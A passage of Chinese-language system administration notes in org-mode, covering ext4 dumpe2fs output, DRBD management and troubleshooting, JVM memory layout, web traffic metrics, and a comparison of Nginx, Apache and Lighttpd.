First block:              0
Block size:               4096
Fragment size:            4096
Reserved GDT blocks:      59
Blocks per group:         32768
Fragments per group:      32768
Inodes per group:         7632
Inode blocks per group:   477
Flex block group size:    16
Filesystem created:       Fri Mar  4 15:38:39 2016
Last mount time:          Fri Mar  4 15:43:07 2016
Last write time:          Fri Mar  4 15:43:18 2016
Mount count:              2
Maximum mount count:      -1
Last checked:             Fri Mar  4 15:38:39 2016
Check interval:           15552000 (6 months)
Next check after:         Wed Aug 31 15:38:39 2016
Lifetime writes:          31 MB
Reserved blocks uid:      0 (user root)
Reserved blocks gid:      0 (group root)
First inode:              11
Inode size:	          256
Required extra isize:     28
Desired extra isize:      28
Journal inode:            8
Default directory hash:   half_md4
Directory Hash Seed:      9df15c3e-07ae-4b01-a8ad-93b3a37fbf2e
Journal backup:           inode blocks
Journal features:         (none)
Journal size:             16M
Journal length:           4096
Journal sequence:         0x00000007
Journal start:            0


Group 0: (Blocks 0-32767) [ITABLE_ZEROED]
  Checksum 0x8329, unused inodes 7620
  Primary superblock at 0, Group descriptors at 1-1
  Reserved GDT blocks at 2-60
  Block bitmap at 61 (+61), Inode bitmap at 77 (+77)
  Inode table at 93-569 (+93)
  28869 free blocks, 7620 free inodes, 2 directories, 7620 unused inodes
  Free blocks: 0-32767
  Free inodes: 13-7632
Group 1: (Blocks 32768-65535) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0x7c29, unused inodes 7632
  Backup superblock at 32768, Group descriptors at 32769-32769
  Reserved GDT blocks at 32770-32828
  Block bitmap at 62 (+4294934590), Inode bitmap at 78 (+4294934606)
  Inode table at 570-1046 (+4294935098)
  32706 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 32830-65535
  Free inodes: 7633-15264
Group 2: (Blocks 65536-98303) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0x3620, unused inodes 7632
  Block bitmap at 63 (+4294901823), Inode bitmap at 79 (+4294901839)
  Inode table at 1047-1523 (+4294902807)
  28672 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 65536-98303
  Free inodes: 15265-22896
Group 3: (Blocks 98304-131071) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xddbb, unused inodes 7632
  Backup superblock at 98304, Group descriptors at 98305-98305
  Reserved GDT blocks at 98306-98364
  Block bitmap at 64 (+4294869056), Inode bitmap at 80 (+4294869072)
  Inode table at 1524-2000 (+4294870516)
  32707 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 98304-131071
  Free inodes: 22897-30528
Group 4: (Blocks 131072-163839) [INODE_UNINIT, BLOCK_UNINIT, ITABLE_ZEROED]
  Checksum 0xc993, unused inodes 7632
  Block bitmap at 65 (+4294836289), Inode bitmap at 81 (+4294836305)
  Inode table at 2001-2477 (+4294838225)
  32768 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 131072-163839
  Free inodes: 30529-38160
Group 5: (Blocks 163840-196607) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xa6f9, unused inodes 7632
  Backup superblock at 163840, Group descriptors at 163841-163841
  Reserved GDT blocks at 163842-163900
  Block bitmap at 66 (+4294803522), Inode bitmap at 82 (+4294803538)
  Inode table at 2478-2954 (+4294805934)
  32707 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 163840-196607
  Free inodes: 38161-45792
Group 6: (Blocks 196608-229375) [INODE_UNINIT, BLOCK_UNINIT, ITABLE_ZEROED]
  Checksum 0xc6d0, unused inodes 7632
  Block bitmap at 67 (+4294770755), Inode bitmap at 83 (+4294770771)
  Inode table at 2955-3431 (+4294773643)
  32768 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 196608-229375
  Free inodes: 45793-53424
Group 7: (Blocks 229376-244135) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xdbf6, unused inodes 7632
  Backup superblock at 229376, Group descriptors at 229377-229377
  Reserved GDT blocks at 229378-229436
  Block bitmap at 68 (+4294737988), Inode bitmap at 84 (+4294738004)
  Inode table at 3432-3908 (+4294741352)
  14699 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 229376-262143
  Free inodes: 53425-61056

lb02# dumpe2fs /dev/sdb1
dumpe2fs 1.41.12 (17-May-2010)
Filesystem volume name:   <none>
Last mounted on:          /mnt
Filesystem UUID:          a528c7ef-0bce-4135-a1b3-c9123f1c60e1
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      has_journal ext_attr resize_inode dir_index filetype extent flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isize
Filesystem flags:         signed_directory_hash 
Default mount options:    (none)
Filesystem state:         clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              61056
Block count:              244136
Reserved block count:     12206
Free blocks:              235896
Free inodes:              61044
First block:              0
Block size:               4096
Fragment size:            4096
Reserved GDT blocks:      59
Blocks per group:         32768
Fragments per group:      32768
Inodes per group:         7632
Inode blocks per group:   477
Flex block group size:    16
Filesystem created:       Fri Mar  4 15:38:39 2016
Last mount time:          Fri Mar  4 15:43:07 2016
Last write time:          Fri Mar  4 15:43:18 2016
Mount count:              2
Maximum mount count:      -1
Last checked:             Fri Mar  4 15:38:39 2016
Check interval:           15552000 (6 months)
Next check after:         Wed Aug 31 15:38:39 2016
Lifetime writes:          31 MB
Reserved blocks uid:      0 (user root)
Reserved blocks gid:      0 (group root)
First inode:              11
Inode size:	          256
Required extra isize:     28
Desired extra isize:      28
Journal inode:            8
Default directory hash:   half_md4
Directory Hash Seed:      9df15c3e-07ae-4b01-a8ad-93b3a37fbf2e
Journal backup:           inode blocks
Journal features:         (none)
Journal size:             16M
Journal length:           4096
Journal sequence:         0x00000007
Journal start:            0


Group 0: (Blocks 0-32767) [ITABLE_ZEROED]
  Checksum 0x8329, unused inodes 7620
  Primary superblock at 0, Group descriptors at 1-1
  Reserved GDT blocks at 2-60
  Block bitmap at 61 (+61), Inode bitmap at 77 (+77)
  Inode table at 93-569 (+93)
  28869 free blocks, 7620 free inodes, 2 directories, 7620 unused inodes
  Free blocks: 0-32767
  Free inodes: 13-7632
Group 1: (Blocks 32768-65535) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0x7c29, unused inodes 7632
  Backup superblock at 32768, Group descriptors at 32769-32769
  Reserved GDT blocks at 32770-32828
  Block bitmap at 62 (+4294934590), Inode bitmap at 78 (+4294934606)
  Inode table at 570-1046 (+4294935098)
  32706 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 32830-65535
  Free inodes: 7633-15264
Group 2: (Blocks 65536-98303) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0x3620, unused inodes 7632
  Block bitmap at 63 (+4294901823), Inode bitmap at 79 (+4294901839)
  Inode table at 1047-1523 (+4294902807)
  28672 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 65536-98303
  Free inodes: 15265-22896
Group 3: (Blocks 98304-131071) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xddbb, unused inodes 7632
  Backup superblock at 98304, Group descriptors at 98305-98305
  Reserved GDT blocks at 98306-98364
  Block bitmap at 64 (+4294869056), Inode bitmap at 80 (+4294869072)
  Inode table at 1524-2000 (+4294870516)
  32707 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 98304-131071
  Free inodes: 22897-30528
Group 4: (Blocks 131072-163839) [INODE_UNINIT, BLOCK_UNINIT, ITABLE_ZEROED]
  Checksum 0xc993, unused inodes 7632
  Block bitmap at 65 (+4294836289), Inode bitmap at 81 (+4294836305)
  Inode table at 2001-2477 (+4294838225)
  32768 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 131072-163839
  Free inodes: 30529-38160
Group 5: (Blocks 163840-196607) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xa6f9, unused inodes 7632
  Backup superblock at 163840, Group descriptors at 163841-163841
  Reserved GDT blocks at 163842-163900
  Block bitmap at 66 (+4294803522), Inode bitmap at 82 (+4294803538)
  Inode table at 2478-2954 (+4294805934)
  32707 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 163840-196607
  Free inodes: 38161-45792
Group 6: (Blocks 196608-229375) [INODE_UNINIT, BLOCK_UNINIT, ITABLE_ZEROED]
  Checksum 0xc6d0, unused inodes 7632
  Block bitmap at 67 (+4294770755), Inode bitmap at 83 (+4294770771)
  Inode table at 2955-3431 (+4294773643)
  32768 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 196608-229375
  Free inodes: 45793-53424
Group 7: (Blocks 229376-244135) [INODE_UNINIT, ITABLE_ZEROED]
  Checksum 0xdbf6, unused inodes 7632
  Backup superblock at 229376, Group descriptors at 229377-229377
  Reserved GDT blocks at 229378-229436
  Block bitmap at 68 (+4294737988), Inode bitmap at 84 (+4294738004)
  Inode table at 3432-3908 (+4294741352)
  14699 free blocks, 7632 free inodes, 0 directories, 7632 unused inodes
  Free blocks: 229376-262143
  Free inodes: 53425-61056
	#+END_SRC
** DRBD管理工具介绍
   #+BEGIN_SRC sh
drbdadm

USAGE: drbdadm COMMAND [OPTION...] {all|RESOURCE...}

GENERAL OPTIONS:
  --stacked, -S
  --dry-run, -d
  --verbose, -v
  --config-file=..., -c ...
  --config-to-test=..., -t ...
  --drbdsetup=..., -s ...
  --drbdmeta=..., -m ...
  --drbd-proxy-ctl=..., -p ...
  --sh-varname=..., -n ...
  --peer=..., -P ...
  --version, -V
  --setup-option=..., -W ...
  --help, -h

COMMANDS:
 attach                             disk-options                       
 detach                             connect                            
 net-options                        disconnect                         
 up                                 resource-options                   
 down                               primary                            
 secondary                          invalidate                         
 invalidate-remote                  outdate                            
 resize                             verify                             
 pause-sync                         resume-sync                        
 adjust                             adjust-with-progress               
 wait-connect                       wait-con-int                       
 role                               cstate                             
 dstate                             dump                               
 dump-xml                           create-md                          
 show-gi                            get-gi                             
 dump-md                            wipe-md                            
 apply-al                           hidden-commands                    

Version: 8.9.5 (api:1)
GIT-hash: 5d50d9fb2a967d21c0f5746370ccc066d3a67f7d build by mockbuild@Build64R6, 2016-01-12 13:02:18

No command specified
dump - 导出配置文件到标准输出
[root@lb01 ~]# drbdadm detach data
[root@lb01 ~]# drbdadm apply-al data
Marked additional 12 MB as out-of-sync based on AL.
[root@lb01 ~]# drbdadm dump-md data
# DRBD meta data dump
# 2016-03-04 17:49:37 +0800 [1457084977]
# lb01.lavenliu.com> drbdmeta 0 v08 /dev/sdb2 0 dump-md
#

version "v08";

# md_size_sect 262144
# md_offset 0
# al_offset 4096
# bm_offset 36864

uuid {
    0x072FEA07005215F3; 0x0000000000000000; 0xAC0A79205C5667AB; 0xAC0979205C5667AB;
    flags 0x00000000;
}
# al-extents 1237;
la-size-sect 1953092;
bm-byte-per-bit 4096;
device-uuid 0x8F00E16B8784D567;
la-peer-max-bio-size 1048576;
al-stripes 1;
al-stripe-size-4k 8;
# bm-bytes 32768;
bm {
   # at 0kB
    16 times 0xFFFFFFFFFFFFFFFF;
    496 times 0x0000000000000000;
   # at 131072kB
    16 times 0xFFFFFFFFFFFFFFFF;
    496 times 0x0000000000000000;
   # at 262144kB
    16 times 0xFFFFFFFFFFFFFFFF;
    3056 times 0x0000000000000000;
}
# bits-set 3072;
   #+END_SRC
   
** DRBD常见故障处理
*** drbd脑裂问题处理
*** 单机启动正常状态
	#+BEGIN_SRC sh
cat /proc/drbd
ro: Secondary/Unknown
	#+END_SRC
*** drbd模块没有被加载引发的报错提示
	#+BEGIN_SRC sh
drbdadm up all
Could not stat("/proc/drbd"): No such file or directory
do you need to load the module?
	#+END_SRC
*** 关于主节点mount分区
	生产存放数据时一定要mount drbd设备，而不是原来的磁盘分区了，这点要
	注意。
	#+BEGIN_SRC sh
mount /dev/drbd0 /data # 正确的挂载，会有heartbeat来控制，在haresources里配置
mount /dev/sdb1 /data  # 错误的挂载，不能挂载分区，这样就跳过DRBD了
	#+END_SRC
*** drbd-overview执行错误
	#+BEGIN_SRC sh
# 正常情况
drbd-overview
0:data/0  Connected Primary/Secondary UpToDate/UpToDate /data ext4 923M 1.2M 874M 1%
# 非正常情况
drbd-overview
perl: warning: Setting locale failed
perl: warning: Please check that your locale settings:
	#+END_SRC
*** can open backing device
	#+BEGIN_SRC sh
drbdadm up data
0: Failure: (104) Can not open backing device.
	#+END_SRC
	解决：有挂载/dev/sdb1导致。
** DRBD状态信息连接解释
*** cs(connection state)
   #+BEGIN_SRC sh
[root@lb01 ~]# cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----
 ns:84 nr:0 dw:84 dr:1043 al:3 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0
 # 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----
 # 0表示第一个resource资源，如本文的/dev/drbd0，且当前此资源处于primary的状态
 # cs （connection state） Status of the network connection
 # 可以通过"drbdadm cstate all"查看cs状态
 [root@lb01 ~]# drbdadm cstate all
 Connected
 # 通常的连接状态为
 # StandAlone    # No network configuration available
 # Disconnecting # Temporary state during disconnection
 # Unconnected   # Temporary state, prior to a connection attempt
 # WFconnection  # This node is waiting until the peer node becomes visible on the network
 # Connected     # A DRBD connection has been established, data mirroring is now active. normal state
   #+END_SRC
*** ro(roles)
	Roles of the nodes.节点角色。

	ro:Primary/Secondary当前执行状态检查的主机为主，左边的角色为当前执行显示命令的主机
	
	#+BEGIN_SRC sh
drbdadm role all
Primary/Secondary
# Primary: 资源目前为主，并且可能正在被读取或写入。如不是双主模式，这种角色
#          只可能出现在两节点中的一个上
# Secondary: 资源目前为从。正常接收主节点上的数据更新。它不能被读取和写入。
# Unknown: 资源角色未知，本地资源不会出现这种状态，只有对等节点在断网
	#+END_SRC
*** ds(disk status)
	state of the hard disks.
	#+BEGIN_SRC sh
ds:UpToDate/UpToDate # 左边为当前执行显示命令的主机状态，右边为对端的主机状态
drbdadm dstate all
UpToDate/UpToDate
# 硬盘信息状态说明
# Diskless： No local block device has been assigned to the DRBD driver.
# Inconsistent: The data is inconsistent. 添加新资源时会出现
# Outdated：资源一致，但是过期了
# DUnknown：对端网络不可用导致的
# Consistent：数据是一致的，但此时未连接。下次再连接时，会决定是UpToDate或Consistent状态
# UpToDate：正常状态
	#+END_SRC
*** 其他一些信息
	#+BEGIN_EXAMPLE
	ns (network send) Volume of net data sent to the partner via the network connection Kibyte
	nr (network receive) 
	dw (disk write) Net data written on local hard disk; in Kibyte
	dr (disk read) Net data read from local hard disk; in Kibyte
	al (activity log) Number of updates of the activity log area of the meta data
	bm (bit map) Number of updates of the bitmap area of the meta data
	lo (local count) Number of updates of the local I/O sub-system issued by DRBD
	pe (pending) 请求发送到对端但是还没有应答
	ua (unacknowledged) 对端通过网络连接收到请求但是还没有应答
	ap (application pending) block I/O requests已经转发到DRBD，但是还没有收到应答
	#+END_EXAMPLE
** DRBD的日常维护
*** 修改drbd.conf后
	#+BEGIN_SRC sh
	drbdadm adjust all
	#+END_SRC
*** 切换角色
** metadata的存储方式
   metadata的存储方式有内部和外部两种方式，都可以在配置文件中进行指定。

   DRBD将数据的各种统计信息及状态消息保存在一个专用的区域里，这个就是
   metadata，这个区域的信息包括有：
   1. DRBD设备的大小
   2. 产生的标识
   3. 活动日志
   4. 快速同步的位图
*** 内部meta data
	内部metadata存放在同一块硬盘或分区的最后的位置上。
	1. 优点：metadata和数据是紧密联系在一起的，如果硬盘损坏，metadata同
       样会损坏。同样在恢复的时候，metadata也会一起被恢复回来。
	2. 缺点：metadata和数据在同一块硬盘上，对于写操作的吞吐量会带来负面
       影响。
*** 外部meta data
	外部的metadata存放在和数据磁盘分开的独立块设备上。
	优点：对于一些写操作可以对一些潜在的行为提供一些改进
	缺点：metadata和数据不是联系在一起的，所以如果数据盘出现故障，
* Heartbeat
* Haproxy
* Nagios
* Zabbix
* GlusterFS
* Ansible
* Fabric
* SaltStack
* Java
** JVM
   虚拟机、字节码、平台无关
*** JVM内存结构
	JVM是按照运行时数据的存储结构来划分内存结构的，JVM在运行java程序时，
	将它们划分成几种不同格式的数据，分别存储在不同的区域，这些数据统一
	称为运行时数据。运行时数据包括Java程序本身的数据信息和JVM运行Java
	需要的额外数据信息。
*** JVM运行时数据区
	+ 程序计数器   - 线程私有
	+ Java虚拟机栈 - 线程私有
	+ 本地方法栈   - 线程私有
	+ Java堆       - 线程公有
	+ 方法区       - 线程公有
*** JVM内存分配
	1. 栈内存分配 (对应于参数 -Xss)
	   + 保存参数、局部变量、中间计算过程和其它数据。退出方法的时候，
         修改栈顶指针就可以把栈帧中的内容销毁
	   + 栈的有点：存取速度比堆快，仅次于寄存器，栈数据可以共享
	   + 栈的缺点：存在栈中的数据大小、生存期是在编译时就确定的，导致
         其缺乏灵活性
	2. 堆内存分配
	   + 堆的有点：动态分配内存大小，生存期不必事先告诉编译器，它是在
         运行期动态分配的，垃圾回收器会自动收走不再使用的空间区域
	   + 堆的缺点：运行时动态分配内存，在分配和销毁时都要占用时间，因
         此堆的效率教低
*** JVM堆结构
	#+BEGIN_EXAMPLE
	| Young区域 | Old区域 | Permanent区域 | 

	Young区域分为：
	| Eden | From | To |
	   E      S0    S1 
	#+END_EXAMPLE
* Tomcat
* 消息中间件
* Ldap
* SQLite3
* WEB
** 一些名词解释
*** PV  - (Page View)
	#+BEGIN_EXAMPLE
	PV(访问量):即页面浏览量或点击量，用户每次刷新即被计算一次。

	PV的具体的度量方法就是从浏览器发出一个网络服务器的请求(Request)，
    网络服务器接到这个请求后，会将该请求对应的一个网页(Page)发送给
    浏览器，从而产生一个PV。那么在这里只要是这个请求发送给了浏览器，
    无论这个页面是否完全打开(下载完成)，那么都是应当计为一个PV。
	#+END_EXAMPLE
*** IP  - (独立IP)
    #+BEGIN_EXAMPLE
	某IP地址的计算机访问网站的次数。是网站分析的一个重要指标。00:00-24:00内
	相同IP地址被计算为一次。
	#+END_EXAMPLE
*** UV  - (独立访客)
	UV(独立访客)：即Unique Visitor，访问网站的一台电脑客户端为一个访客。
    00:00-24:00内相同的客户端只被计算一次。

	UV(独立访客)：独立的自然人访问，一个人访问记一个UV，通过不同技术
    方法来记录，实际会有误差。
*** UV的度量
	1. 网站服务器分辨
	   #+BEGIN_EXAMPLE
	   网站服务器会接收很多页面请求，每次请求的信息内部都包含了我们的
       电脑的一些信息，比如：IP地址，请求发出的时间，浏览器版本，操作
       系统版本等等。网站服务器对这些请求进行分析，如果这些请求满足一
       些共同的特征，比如来自同一个IP地址，且浏览器版本，操作系统版本
       相同，请求时间又相近等等，如果满足这一系列的定义，那么就可以认
       为这些请求是来自同一个Visitor，那么这些访问自然是产生1个UV。当
       然，共同特征的该如何定义是由网站服务器的设置决定的。通常来讲，
       用IP地址+其他特征共同来定义的情况比较常见。
	   #+END_EXAMPLE
	2. 用Cookie分辨
	   #+BEGIN_EXAMPLE
	   当客户端第一次访问某个网站服务器的时候，网站服务器会给这个客户
       端的电脑发出一个Cookie，通常放在这个客户端的C盘当中。在这个
       Cookie中会分配一个独一无二的编号，这其中会记录一些访问服务器的
       信息，如访问时间，访问了哪些页面等等。当我们下次再访问这个服务
       器的时候，服务器就可以直接从我们的电脑中找到上一次放进去的
       Cookie文件，并且对其进行一些更新，但那个独一无二的编号是不会变
       的。如果在一定时间内，服务器发现2个Visit所对应的是一个编号，那
       么我们自然可以认为这个来源于同一个Visitor了，自然也就是1个UV。

	   使用Cookie的方法要比第一个更精确些。但也存在一些问题，比如：有
       的客户端为保证更高级别的安全，关闭了Cookie的功能；或者是有些客
       户端设置了在退出页面时自动删除Cookie，亦或我们经常自己去手动删
       除Cookie，那么这个方法就不在那么精确了。

	   由此看来，两个方法都只能得到近似的UV，而不是绝对精确的。但在浩
       如烟海的访问数据中，能计量出这些数据对我们的网站分析工作已经是
       可以有所指导并用于分析使用了。了解了这些数据的实际度量方法，有
       利于我们更加真实地还原用户的使用行为，让我们对网站真实的使用情
       况了解的更清晰。
	   #+END_EXAMPLE
** 企业网站对PV/IP/UV的度量
*** IP的度量
    1. 分析所有web服务器的访问日志信息，对IP地址段去重后计数，这是IT人员的基本计算手段。
    2. 在网站的每一个（所有）页面结尾，嵌入js等统计程序代码，当用户加
       载网页后，IP传给统计IP的服务器，这种方法一般被第三方公司或者企
       业内部开发日志分析程序时使用。
    3. 用第三方大家比较信任的统计工具，例如：谷歌的统计（GA）

    IP的统计方法简单、易用，因此，成为了多数网站衡量网站流量的重要指标之一。
*** PV的度量
    1. 分析web服务的访问日志（需要排除js、css，各种图片的日志信息），只计算html、php等页面。
    2. 在网站的每一个（所有）页面结尾，嵌入js等统计程序代码，当用加载
       网页后，IP即传给统计IP的服务器，这种方法一般被第三方统计公司或
       者企业内部开发日志分析程序时使用。
    3. 用第三方大家比较信任的统计工具。

    PV的统计方法也简单、易用，因此，也是多数网站衡量网站流量的重要指
    标之一。
*** UV的度量
    1. 通过客户端HTTP请求报文分析
       #+BEGIN_EXAMPLE
       一个客户端会多次请求网站服务器，每次HTTP请求都会携带客户端自身的大量信息，
       比如，IP地址，请求发出的时间，浏览器版本，操作系统版本等等。网站服务器对这些
       请求进行分析，如果这些请求满足一些共同特征，比如来自同一个IP地址，且浏览器版本，
       操作系统版本相同，请求时间又相近等等，如果满足这一系列的定义，那么就可以认为
       这些请求是来自于同一个客户端，那么多个页面访问也算是一个UV。共同特征的定义是
       由服务方决定的。通常，用IP地址+其他特征共同来定义的情况较多。此种度量方法无法解决
       以下问题，例如：
       1. 多个人的电脑软硬件经常雷同，并且是一个公司或者学校的人
       2. 多个人公用一台电脑
       #+END_EXAMPLE
    2. 通过cookie鉴别
       #+BEGIN_EXAMPLE
       当客户端第一次访问某个网站服务器的时候，网站服务器会给这个客户端的电脑发出一个Cookie，
       通常放在这个客户端电脑的C盘当中。在这个Cookie中会分配一个独一无二的编号，
       这其中会记录一些访问服务器的信息，如访问时间，访问了哪些页面等待。当你下次再访问
       这个服务器的时候，服务器就可以直接从你的电脑中找到上一次放进去的Cookie文件，并且对
       其进行一些更新，但那个独一无二的编号是不会变的。如果在一定时间内，服务器发现两个
       来访者对应的是一个编号，那么我们自然可以认为这个来源于同一个来访者了，就计算一个UV。

       使用Cookie的方法要比分析客户端HTTP请求头部信息分析更精确。但也存在一些问题，比如：
       有的客户端为保证更高级别的安全，关闭了Cookie的功能；或者是有些客户端设置了在退出
       页面时自动删除Cookie，亦或你经常自己手动删除Cookie，那么这个方法就不那么精确了。

       因此，以上两个方法都只能得到近似的UV，而不是绝对精确的。
       #+END_EXAMPLE

*** 并发连接
    1. 网站并发连接
       #+BEGIN_EXAMPLE
       在面试过程中Linux运维人员经常会被问到：你的公司网站最大并发是多少？
       那么到底什么是并发，怎么理解并发呢？
       A种理解：网站服务器每秒能够接收的最大用户请求数
       B种理解：网站服务器每秒能够响应的最大用户请求数
       C种理解：网站服务器在单位时间内能够处理的最大连接数 - 较好

       对于网站服务器来说，所谓的并发就是单位时间内，服务器能够同时处理的最大连接数，
       因为有的请求1秒结束，有的请求可能10秒才结束（业务程序及配置不同），因此，网站
       并发不是客户端每秒的并发请求数，而是服务器在一段时间内（1秒或者数秒内）可以处理的
       最大连接数，这个连接既包含正在建立的连接，也包含已经建立的连接。

       例如：某网站的并发是5000
       意味着：单位时间内（理解为1秒或数秒内），正在处理的连接数，正在建立的连接数。加起来一共是5000个。
       #+END_EXAMPLE
** 当前互联网主流WEB服务说明
   当前互联网主流web服务软件，常用来提供静态文本服务的软件：
   1. apache - 中小型web服务的主流，web服务器中的老大哥
   2. nginx - 大型网站web服务主流
   3. Lighttpd - 不温不火

   常用来提供动态服务的软件：
   1. php（FastCGI）大中小型网站都会使用，动态网页语言php程序的解析容器。
	  + 配合apache解析动态程序，这里的php不是FastCGI守护进程模式，而是mod_php5.so(module)。
	  + 配合nginx解析动态程序，这里的php常用FastCGI守护进程模式提供服务。
   2. tomcat 中小企业动态web服务主流，互联网java容器主流
   3. resin 大型动态web服务主流，互联网java容器主流
*** www静态程序服务软件apache
	建议使用2.2版本
*** www静态程序服务软件nginx
*** www动态服务软件resin
	Resin官方号称是世界上最快的web服务，是大型动态web服务主流，互联网
	java程序的解析容器。。
*** www动态服务软件PHP
	PHP软件是大中小型网站程序前台页面开发的首选，它是动态网页语言php程
	序的解析器。PHP版本系列有5.2、5.3、5.4、5.5及5.6，其中最经典的版本
	是5.2系列。

	值得注意的是，PHP提供解析的方式，配合Apache解析动态程序，是
	mod_php5.so（module）模块的方式，配合nginx解析动态程序，常用
	FastCGI守护进程模式提供服务。
* Apache
* Nginx
  Nginx与Apache相比，在性能上，占用更少的系统资源，特定的场景应用(静态
  数据)能支持更多的并发连接，达到更高的访问效率；在功能上，Nginx是一个
  优秀的代理服务器和负载均衡服务器，也可以作为缓存服务器；在安装配置上，
  Nginx安装简单、配置灵活。
** Nginx特点及应用场景
*** Nginx特点
	Nginx是一个高性能的Web和反向代理服务器，它具有很多优越的特性，作为
	Web服务器，和Apache相比，Nginx能够支持更多的并发连接，而占用更少的
	资源，效率很高。

	作为负载均衡服务器，Nginx可以作为HTTP或DB等服务的代理服务器，类似
	专业的HAproxy软件功能(Nginx代理功能相对简单，代理功能及效率不及
	HAproxy)。

	Nginx同时也是一款优秀的邮件代理服务软件(最早开发这个产品的目的之一
	也是作为邮件代理服务)。

	Nginx还可以作为缓存服务器使用，相当于专业的缓存软件squid。

	Nginx的安装简单，配置文件简洁、配置灵活(支持Perl语法)。

	Nginx的HTTP服务器特性：
	1. 处理静态文件，索引文件以及自动索引；打开文件描述符缓存；
	2. 使用缓存加速反向代理；简单负载均衡以及容错；
	3. 远程FastCGI服务的缓存加速支持；
	4. 模块化的架构。过滤器包括gzip压缩、ranges支持、chunked响应、XSLT、
       SSL以及图像缩放。在SSL过滤器中，一个包含多个SSI的页面，如果经由
       FastCGI或反向代理处理，可被并行处理；
	5. 支持SSL，TLS SNI；
	6. 基于名字和IP的虚拟主机；
	7. Keep-alive和pipelined连接支持；
	8. 灵活的配置；
	9. 重新加载配置以及在线升级时，不需要中断正在处理的请求；
	10. 自定义访问日志格式，带缓存的日志写操作以及快速日志轮转；
	11. 3xx-5xx错误代码重定向；
	12. 重写(rewrite)模块；
	13. 基于客户端IP地址和HTTP基本认证机制的访问控制；
	14. 支持PUT、DELETE、MKCOL、COPY以及MOVE方法；
	15. 支持FLV流和MP4流；
	16. 速度限制；
	17. 来自同一地址的同时连接数或请求数限制；

    Nginx优点总结：
	#+BEGIN_EXAMPLE
	Nginx最主要的优点是：支持kqueue(FreeBSD 4.1+), epoll(Linux 2.6+)等网络IO事件
	模型。由此来支持高并发。
	#+END_EXAMPLE
	1. 高并发：能支持1-2万甚至更多的并发连接(静态小文件环境下)
	2. 内存消耗少：在3万并发连接下，开启的10个Nginx进程消耗不到200M内存
	3. 可以做HTTP反向代理，即负载均衡功能，相当于专业的HAproxy软件或lvs功能
	4. 内置对RS服务器健康检查功能；如果Nginx Proxy后端某台Web服务器宕
       机，不会影响前端的访问
	5. 通过cache插件(cache_purge)可以实现类squid等专业的缓存软件实现的功能
*** Nginx主要应用场景
	1. 使用Nginx结合FastCGI运行PHP、JSP、Perl等程序
	2. 使用Nginx做反向代理、负载均衡、规则过滤
	3. 使用Nginx运行静态HTML网页、小图片等
	4. 使用Nginx加cache插件实现对web服务器缓存功能
** 主流web服务产品对比说明
   1. Apache
	  + 2.2版本非常稳定强大，据官方说明，其2.4版本性能超强
	  + prefork模式取消了进程创建开销，性能很高
	  + 处理动态业务数据时，因关联到后端的引擎和数据库，瓶颈不在于
        Apache本身
	  + 高并发时消耗系统资源相对比较多一些
   2. Nginx
	  + 基于异步IO模型，性能强，能够支持上万并发
	  + 对小文件支持很好，性能很高(限静态小文件)
	  + 代码优雅，扩展库必须编译进主程序
	  + 消耗系统资源比较低
   3. Lighttpd
	  + 基于异步IO模型，性能和Nginx相近
	  + 扩展库是so模式，比Nginx要灵活
	  + 全球使用率比以前低，安全性没有上面两个好
	  + 通过插件(mod_secdownload)可以实现文件URL地址加密
** WEB服务产品性能对比测试
   1. WEB服务器静态内容测试数据
      + 处理静态小文件(小于1M)，Nginx和lighttpd比Apache更有优势
	  + Nginx在处理小文件优势明显

      |          |      1K |     10K |    100K |      1M |     10M |
      |----------+---------+---------+---------+---------+---------|
      | Apache   | 12241.6 | 11749.7 | 6524.32 | 1501.13 | 166.933 |
      | Nginx    | 18020.5 | 17947.3 | 12888.2 | 12879.9 | 232.398 |
      | Lighttpd | 18377.9 | 19593.9 | 13140.9 | 2040.06 | 224.433 | 
   2. WEB服务器动态内容测试数据
	  + 处理动态内容三者相差不大(测试环境差异)，主要取决于PHP和数据库
        的处理性能

      |          |    echo |     1K |     10K |   100K |      1M |
      |----------+---------+--------+---------+--------+---------|
      | Apache   | 5044.32 | 4811.3 | 4460.61 | 2331.9 | 296.912 |
      | Nginx    | 4060.73 | 3748.6 | 3264.30 | 1631.8 | 227.167 |
      | Lighttpd | 5714.10 | 5815.9 | 4110.23 | 816.52 | 191.933 | 

   可以看到Nginx，也并不是什么都强的，在处理大文件和动态数据时优势并不
   明显。当处理动态数据时，三者的差距不大，从测试结果来看，Apache更有
   优势一点。这是因为处理动态数据的能力取决于PHP和后端数据库的提供服务
   能力。也就是说瓶颈不在web服务器上。一般PHP支持的并发参考值300-1000，
   JAVA引擎支持并发300-1000。
** 为什么Nginx的总体性能比Apache高
